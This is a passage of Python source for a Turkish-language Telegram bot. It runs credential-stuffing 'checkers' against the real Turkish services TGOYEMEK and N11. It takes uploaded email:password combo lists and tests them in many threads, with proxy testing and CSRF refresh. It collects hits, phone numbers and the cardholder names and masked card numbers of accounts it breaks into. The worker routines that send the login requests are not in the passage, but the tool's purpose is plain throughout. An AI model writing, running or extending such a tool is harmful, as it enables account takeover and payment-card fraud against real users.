            if r.status_code in (200, 301, 302, 400, 401, 403, 404):
                return "hit", display, ping
            return "other", display, ping
    except Exception:
        return "dead", display, None


class Stats:
    __slots__ = ("total", "checked", "hit", "dead", "other", "_lock")

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.hit = 0
        self.dead = 0
        self.other = 0
        self._lock = asyncio.Lock()

    async def add(self, kind):
        async with self._lock:
            self.checked += 1
            if kind == "hit":
                self.hit += 1
            elif kind == "dead":
                self.dead += 1
            else:
                self.other += 1


def live_table(stats, header):
    pct = (stats.checked / stats.total * 100) if stats.total else 0
    bar_len = 20
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    return (f"⚙️ <b>{header}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{bar}</code> {pct:.1f}%\n\n"
            f"📦 Toplam : {stats.total:,}\n"
            f"✔️ Kontrol: {stats.checked:,}\n"
            f"✅ Hit   : {stats.hit:,}\n"
            f"❌ Dead  : {stats.dead:,}\n"
            f"⚠️ Other : {stats.other:,}")


async def live_updater(status_msg, stats):
    last_text = ""
    while True:
        try:
            await asyncio.sleep(UPDATE_INTERVAL)
            if stats.checked >= stats.total:
                break
            text = live_table(stats, "ÇALIŞIYOR")
            if text != last_text:
                await safe_edit(status_msg, text, parse_mode="HTML")
                last_text = text
        except asyncio.CancelledError:
            raise
        except Exception:
            continue


async def run_proxy_test(update, status_msg, proxies):
    total = len(proxies)
    stats = Stats(total)
    temp_dir = tempfile.mkdtemp(prefix="proxy_results_")
    hit_path = os.path.join(temp_dir, "hit.txt")
    dead_path = os.path.join(temp_dir, "dead.txt")
    other_path = os.path.join(temp_dir, "other.txt")

    hit_f = open(hit_path, "w", encoding="utf-8", buffering=1024 * 1024)
    dead_f = open(dead_path, "w", encoding="utf-8", buffering=1024 * 1024)
    other_f = open(other_path, "w", encoding="utf-8", buffering=1024 * 1024)

    update_task = asyncio.create_task(live_updater(status_msg, stats))
    loop = asyncio.get_event_loop()
    HARD_LIMIT = TIMEOUT * 4

    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [loop.run_in_executor(executor, test_proxy, p) for p in proxies]
            for fut in asyncio.as_completed(futures):
                try:
                    result, display, ping = await asyncio.wait_for(fut, timeout=HARD_LIMIT)
                except (asyncio.TimeoutError, Exception):
                    await stats.add("dead")
                    dead_f.write("timeout\n")
                    continue
                await stats.add(result)
                if result == "hit":
                    hit_f.write(display + "\n")
                elif result == "dead":
                    dead_f.write(display + "\n")
                else:
                    other_f.write(display + "\n")
                if stats.checked % 500 == 0:
                    hit_f.flush(); dead_f.flush(); other_f.flush()
    finally:
        update_task.cancel()
        try:
            await update_task
        except asyncio.CancelledError:
            pass
        hit_f.close(); dead_f.close(); other_f.close()

    if stats.checked < total:
        stats.dead += (total - stats.checked)
        stats.checked = total

    await safe_edit(status_msg, live_table(stats, "TAMAMLANDI"), parse_mode="HTML")

    files = []
    for path, label in ((hit_path, "hit"), (dead_path, "dead"), (other_path, "other")):
        if os.path.exists(path) and os.path.getsize(path) > 0:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for _ in f)
            files.append((path, label, count))

    for path, label, count in files:
        await safe_send_file(update.message, path, filename=f"{label}.txt",
                             caption=f"📄 {label.upper()} — {count:,} adet")

    try:
        zip_path = os.path.join(temp_dir, "proxy_results.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for path, label, _ in files:
                zf.write(path, arcname=f"{label}.txt")
        await safe_send_file(update.message, zip_path, filename="proxy_results.zip",
                             caption=f"📦 TÜM SONUÇLAR\n✅ Hit: {stats.hit:,}\n"
                                     f"❌ Dead: {stats.dead:,}\n⚠️ Other: {stats.other:,}")
        os.remove(zip_path)
    except Exception:
        pass

    for p in (hit_path, dead_path, other_path):
        try:
            os.remove(p)
        except Exception:
            pass
    try:
        os.rmdir(temp_dir)
    except Exception:
        pass


def generate_proxy_line(index):
    networks = ((192, 0, 2), (198, 51, 100), (203, 0, 113))
    n = networks[index % len(networks)]
    host = ((index // len(networks)) % 254) + 1
    port = 1024 + (index % 64512)
    return f"{n[0]}.{n[1]}.{n[2]}.{host}:{port}"


def create_generator_files(amount, directory):
    files, cf, cp, cc, fn = [], None, None, 0, 0
    try:
        for index in range(amount):
            if cf is None or cc >= LINES_PER_FILE:
                if cf is not None:
                    cf.close(); files.append(cp)
                fn += 1
                cp = os.path.join(directory, f"tr_test_{fn:03d}.txt")
                cf = open(cp, "w", encoding="utf-8", buffering=1024 * 1024)
                cc = 0
            cf.write(generate_proxy_line(index) + "\n")
            cc += 1
        if cf is not None:
            cf.close(); files.append(cp)
    except Exception:
        if cf is not None:
            try: cf.close()
            except Exception: pass
        raise
    return files


# ============================================================
# DASHBOARD (checker)
# ============================================================
def build_dashboard():
    with STATS_LOCK:
        elapsed = time.time() - STATS["start_time"] if STATS["start_time"] else 0
        mins, secs = divmod(int(elapsed), 60)
        speed = STATS["checked"] / elapsed if elapsed > 0 else 0
        remaining = STATS["total"] - STATS["checked"]
        eta = remaining / speed if speed > 0 else 0
        eta_m, eta_s = divmod(int(eta), 60)
        return (
            f"📊 <b>CHECKER TABLOSU</b>\n━━━━━━━━━━━━━━━\n"
            f"🎯 Aktif: <b>{STATS.get('active_checker','-')}</b>\n"
            f"📦 Toplam: <b>{STATS['total']}</b>\n"
            f"✅ Kontrol: <b>{STATS['checked']}</b>\n"
            f"🎯 Hit: <b>{STATS['hits']}</b>\n"
            f"💳 Kart: <b>{STATS['cards_found']}</b>\n"
            f"📞 Telefon: <b>{STATS['phone']}</b>\n"
            f"❌ Yanlış: <b>{STATS['bad']}</b>\n"
            f"🔁 Retry: <b>{STATS['retried']}</b>\n━━━━━━━━━━━━━━━\n"
            f"⚡ Hız: <b>{speed:.2f}</b> h/s\n"
            f"⏱ Süre: <b>{mins}d {secs}s</b>\n"
            f"⏳ ETA: <b>{eta_m}d {eta_s}s</b>\n"
            f"🔄 CSRF: <b>{STATS['csrf_count']}</b>\n━━━━━━━━━━━━━━━\n"
            f"🛒 N11 — Hit: <b>{STATS.get('n11_hits',0)}</b> · "
            f"Bad: <b>{STATS.get('n11_bad',0)}</b> · "
            f"Askı: <b>{STATS.get('n11_susp',0)}</b> · "
            f"Kart: <b>{STATS.get('n11_cards',0)}</b>\n━━━━━━━━━━━━━━━\n"
            f"🕐 Son Hit: <b>{STATS['last_hit']}</b>\n"
            f"💳 Son Kart: <b>{STATS['last_card']}</b>\n"
            f"📡 Durum: <b>{'ÇALIŞIYOR' if STATS['running'] else 'DURDU'}</b>"
        )


# ============================================================
# BOT HANDLERS
# ============================================================
def main_menu():
    keyboard = [
        [InlineKeyboardButton("🎯 TGOYEMEK Checker", callback_data="tgo_checker"),
         InlineKeyboardButton("🛒 N11 Checker", callback_data="n11_checker")],
        [InlineKeyboardButton("🔎 Proxy Test", callback_data="proxy_test"),
         InlineKeyboardButton("🇹🇷 Generator", callback_data="generator")],
        [InlineKeyboardButton("📊 Canlı Durum", callback_data="status"),
         InlineKeyboardButton("ℹ️ Yardım", callback_data="help")],
    ]
    return InlineKeyboardMarkup(keyboard)


def back_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Menü", callback_data="menu")]])


def cancel_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ İptal", callback_data="cancel")]])


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await safe_reply(update.message,
                     "🤖 <b>UNIFIED BOT</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
                     "🎯 TGOYEMEK Checker\n🛒 N11 Checker\n🔎 Proxy Test\n🇹🇷 Generator\n\n"
                     "İşlem seç:",
                     parse_mode="HTML", reply_markup=main_menu())


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass
    msg = query.message
    data = query.data

    if data == "menu":
        context.user_data.clear()
        await safe_edit(msg, "🤖 <b>UNIFIED BOT</b>\n\nİşlem seç:",
                        parse_mode="HTML", reply_markup=main_menu())
        return

    if data in ("tgo_checker", "n11_checker"):
        context.user_data.clear()
        context.user_data["waiting_combo"] = "tgo" if data == "tgo_checker" else "n11"
        await safe_edit(
            msg,
            f"🎯 <b>{'TGOYEMEK' if data=='tgo_checker' else 'N11'} CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<code>email:password</code> formatında\n"
            f"combo.txt dosyasını gönder.\n\n"
            f"⚡ {THREAD_COUNT} thread · ⏱ 3sn/istek",
            parse_mode="HTML", reply_markup=back_menu())
        return

    if data == "proxy_test":
        context.user_data.clear()
        context.user_data["waiting_proxy_file"] = True
        await safe_edit(
            msg,
            "🔎 <b>PROXY TEST</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "Proxy listesini gönder (.txt / .zip)\n\n"
            "Format:\n<code>IP:PORT</code>\n<code>IP:PORT:USER:PASS</code>\n"
            f"<code>USER:PASS@IP:PORT</code>\n\n"
            f"⚡ Worker: {MAX_WORKERS} · ⏱ Timeout: {TIMEOUT}s",
            parse_mode="HTML", reply_markup=back_menu())
        return

    if data == "generator":
        context.user_data.clear()
        context.user_data["waiting_generator_amount"] = True
        await safe_edit(msg,
                        "🇹🇷 <b>TR PROXY GENERATOR</b>\n\nKaç adet? (maks 1.000.000)",
                        parse_mode="HTML", reply_markup=cancel_menu())
        return

    if data == "status":
        await safe_edit(msg, build_dashboard(), parse_mode="HTML",
                        reply_markup=dashboard_buttons())
        return

    if data == "help":
        await safe_edit(
            msg,
            "ℹ️ <b>YARDIM</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 <b>Checker</b> — combo.txt gönder, RAM'de çalışır\n"
            "🔎 <b>Proxy Test</b> — txt/zip, hit/dead/other\n"
            "🇹🇷 <b>Generator</b> — sentetik TR kayıt\n\n"
            "Komutlar: /start /status /stop",
            parse_mode="HTML", reply_markup=back_menu())
        return

    if data == "refresh_csrf":
        CSRF_REFRESH_FLAG.set()
        await safe_edit(msg, build_dashboard(), parse_mode="HTML",
                        reply_markup=dashboard_buttons())
        return

    if data in ("show_cards", "show_hits", "show_phone",
                "n11_show_hits", "n11_show_susp"):
        src, title = {
            "show_cards": (MEMORY_CARDS, "💳 Kartlar"),
            "show_hits": (MEMORY_HITS, "🎯 TGO Hit"),
            "show_phone": (MEMORY_PHONE, "📞 Telefon"),
            "n11_show_hits": (MEMORY_N11_HITS, "🛒 N11 Hit"),
            "n11_show_susp": (MEMORY_N11_SUSP, "⚠️ N11 Askı"),
        }[data]
        with MEMORY_LOCK:
            items = list(src)
        if not items:
            await safe_edit(msg, f"{title}\n\nBoş.", parse_mode="HTML",
                            reply_markup=dashboard_buttons())
            return
        lines = [f"{title} ({len(items)})\n"]
        for i, it in enumerate(items[-30:], 1):
            if isinstance(it, tuple):
                lines.append(f"{i}. <code>{html.escape(str(it[0]))}</code> — "
                             f"<b>{html.escape(it[1].get('name','-'))}</b> "
                             f"<code>{html.escape(it[1].get('maskedCardNumber','-'))}</code>")
            else:
                lines.append(f"{i}. <code>{html.escape(str(it))}</code>")
        await safe_edit(msg, "\n".join(lines), parse_mode="HTML",
                        reply_markup=dashboard_buttons())
        return

    if data == "cancel":
        context.user_data.clear()
        await safe_edit(msg, "❌ İptal.", reply_markup=main_menu())
        return


def dashboard_buttons():
    return {"inline_keyboard": [
        [{"text": "🔄 CSRF", "callback_data": "refresh_csrf"},
         {"text": "📊 Durum", "callback_data": "status"}],
        [{"text": "💳 Kartlar", "callback_data": "show_cards"},
         {"text": "🎯 TGO Hit", "callback_data": "show_hits"}],
        [{"text": "📞 Telefon", "callback_data": "show_phone"}],
        [{"text": "🛒 N11 Hit", "callback_data": "n11_show_hits"},
         {"text": "⚠️ N11 Askı", "callback_data": "n11_show_susp"}],
    ]}


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("waiting_generator_amount"):
        await generator_amount(update, context)
        return
    await safe_reply(update.message, "Menü: /start", reply_markup=main_menu())


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        return
    filename = document.file_name or "unknown"
    lower = filename.lower()

    # COMBO CHECKER
    if context.user_data.get("waiting_combo"):
        checker = context.user_data["waiting_combo"]
        if not (lower.endswith(".txt") or lower.endswith(".list")):
            await safe_reply(update.message, "❌ .txt gönder.")
            return
        if document.file_size and document.file_size > MAX_FILE_SIZE:
            await safe_reply(update.message, "❌ Dosya büyük.")
            return
        status = await safe_reply(update.message, "📥 Combo indiriliyor...")
        try:
            tg_file = await safe_call(document.get_file)
            raw_bytes = await safe_call(tg_file.download_as_bytearray)
            text = raw_bytes.decode("utf-8", errors="ignore")
            combos = []
            for line in text.splitlines():
                line = line.strip()
                if ":" not in line:
                    continue
                e, p = line.split(":", 1)
                combos.append((e.strip(), p.strip()))
            if not combos:
                await safe_edit(status, "❌ Geçerli combo yok.")
                return
            context.user_data.pop("waiting_combo", None)
            await safe_edit(
                status,
                f"🚀 <b>Başlıyor</b>\n"
                f"🎯 {'TGOYEMEK' if checker=='tgo' else 'N11'}\n"
                f"📦 {len(combos)} hesap · 🧵 {THREAD_COUNT} thread",
                parse_mode="HTML")

            with STATS_LOCK:
                for k in STATS:
                    if isinstance(STATS[k], int):
                        STATS[k] = 0
                STATS["total"] = len(combos)
                STATS["start_time"] = time.time()
                STATS["running"] = True
                STATS["active_checker"] = "TGOYEMEK" if checker == "tgo" else "N11"

            loop = asyncio.get_event_loop()
            if checker == "n11":
                await loop.run_in_executor(None, n11_worker_pool, combos)
            else:
                await loop.run_in_executor(None, worker_pool, combos)

            with STATS_LOCK:
                STATS["running"] = False
            await safe_reply(update.message, build_dashboard(),
                             parse_mode="HTML", reply_markup=dashboard_buttons())
        except Exception as e:
            logger.exception("Combo handler error")
            await safe_edit(status, f"❌ Hata: {e}")
        return

    # PROXY TEST
    if context.user_data.get("waiting_proxy_file"):
        is_zip = lower.endswith(".zip")
        is_txt = lower.endswith(".txt")
        if not (is_zip or is_txt):
            await safe_reply(update.message, "❌ .txt / .zip.")
            return
        if document.file_size and document.file_size > MAX_FILE_SIZE:
            await safe_reply(update.message, "❌ Dosya büyük.")
            return
        status = await safe_reply(update.message, "📥 İndiriliyor...")
        temp_dir = tempfile.mkdtemp(prefix="proxy_test_")
        try:
            tg_file = await safe_call(document.get_file)
            local_path = os.path.join(temp_dir, filename)
            await safe_call(tg_file.download_to_drive, local_path)
            await safe_edit(status, "🔧 İşleniyor...")
            proxies, info = await asyncio.to_thread(
                process_uploaded_file, local_path, is_zip, temp_dir)
            if not proxies:
                await safe_edit(status, "❌ Proxy yok.")
                return
            context.user_data.pop("waiting_proxy_file", None)
            await safe_edit(
                status,
                f"🔎 <b>TEST BAŞLIYOR</b>\n📦 {len(proxies):,}\n"
                f"⚡ {MAX_WORKERS} worker · ⏱ {TIMEOUT}s",
                parse_mode="HTML")
            await run_proxy_test(update, status, proxies)
        except Exception as e:
            logger.exception("Proxy test error")
            await safe_edit(status, f"❌ Hata: {e}")
        finally:
            try:
                for root, dirs, fs in os.walk(temp_dir, topdown=False):
                    for f in fs:
                        try: os.remove(os.path.join(root, f))
                        except Exception: pass
                    for d in dirs:
                        try: os.rmdir(os.path.join(root, d))
                        except Exception: pass
                os.rmdir(temp_dir)
            except Exception:
                pass
        return

    await safe_reply(update.message, "Önce menüden işlem seç: /start",
                     reply_markup=main_menu())


async def generator_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(".", "").replace(",", "").replace(" ", "")
    if not text.isdigit():
        await safe_reply(update.message, "❌ Sayı gir. Örn: 5000")
        return
    amount = int(text)
    if amount < 1 or amount > MAX_GENERATE:
        await safe_reply(update.message, f"❌ 1-{MAX_GENERATE:,}")
        return
    context.user_data.pop("waiting_generator_amount", None)
    status = await safe_reply(update.message, "⚙️ Üretiliyor...")
    started = time.perf_counter()
    temp_dir = tempfile.mkdtemp(prefix="proxy_generator_")
    try:
        files = await asyncio.to_thread(create_generator_files, amount, temp_dir)
    except Exception as e:
        await safe_edit(status, f"❌ {e}")
        return
    elapsed = round(time.perf_counter() - started, 2)
    await safe_edit(status,
                    f"🇹🇷 <b>HAZIR</b>\n📦 {amount:,}\n📁 {len(files)}\n⏱ {elapsed}s",
                    parse_mode="HTML")
    for i, path in enumerate(files, 1):
        await safe_send_file(update.message, path, filename=os.path.basename(path),
                             caption=f"🇹🇷 {i}/{len(files)}")
    for p in files:
        try: os.remove(p)
        except Exception: pass
    try: os.rmdir(temp_dir)
    except Exception: pass
    await safe_edit(status, f"✅ Bitti · {amount:,} kayıt · {elapsed}s",
                    parse_mode="HTML")


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply(update.message, build_dashboard(),
                     parse_mode="HTML", reply_markup=dashboard_buttons())


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STOP_EVENT.set()
    await safe_reply(update.message, "🛑 STOP sinyali gönderildi.")


async def post_init(app):
    me = await app.bot.get_me()
    logger.info("Bot: @%s", me.username)
    tg_send(f"✅ <b>UNIFIED BOT AKTİF</b>\n@ {me.username}")


# ============================================================
# MAIN
# ============================================================
def main():
    _install_signal_handlers()
    logger.info("İnternet kontrol...")
    ok, host = check_internet()
    if not ok:
        logger.error("İnternet yok")
        return
    logger.info("İnternet OK (%s)", host)

    ok, info = check_telegram_api()
    if not ok:
        logger.error("Telegram API erişilemiyor: %s", info)
        return
    logger.info("Telegram API OK (@%s)", info)

    app = (ApplicationBuilder()
           .token(BOT_TOKEN)
           .request(build_request())
           .get_updates_request(build_updater_request())
           .post_init(post_init)
           .build())

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("Bot polling başlıyor...")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()